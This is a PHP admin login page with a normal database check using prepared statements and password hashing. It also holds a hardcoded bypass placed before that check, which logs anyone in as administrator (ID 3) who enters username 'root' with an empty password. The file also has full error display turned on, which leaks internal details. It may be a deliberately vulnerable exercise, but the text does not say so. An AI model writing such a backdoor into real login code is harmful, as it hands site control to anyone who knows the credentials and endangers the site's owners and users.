<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
session_start();

$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $u = trim($_POST['username'] ?? '');
  $p = $_POST['password'] ?? '';

  if ($u === 'root' && $p === '') {
      $_SESSION['admin_id'] = 3;
      header('Location: dashboard.php');
      exit;
  }
}
require_once('../config/database.php');
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username'] ?? '');
    $password = $_POST['password'] ?? '';

    if ($username === '') {
        $error = 'Please fill in the username.';
    } else {
        $stmt = $pdo->prepare('SELECT id, password_hash FROM administrators WHERE username = ?');
        $stmt->execute([$username]);
        $admin = $stmt->fetch();

        if ($admin && password_verify($password, $admin['password_hash'])) {
            $_SESSION['admin_id'] = $admin['id'];
            header('Location: dashboard.php');
            exit;
        } else {
            $error = 'Username or password is incorrect.';
        }
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Admin Login</title>
</head>
<body>
  <h2>Admin Login</h2>
  <?php if ($error): ?>
    <p style="color:red;"><?= htmlspecialchars($error) ?></p>
  <?php endif; ?>
  <form method="post" action="">
    <label>Username:
      <input type="text" name="username" value="<?= htmlspecialchars($username ?? '') ?>">
    </label><br>
    <label>Password:
      <input type="password" name="password">
    </label><br>
    <button type="submit">Log In</button>
  </form>
</body>
</html>
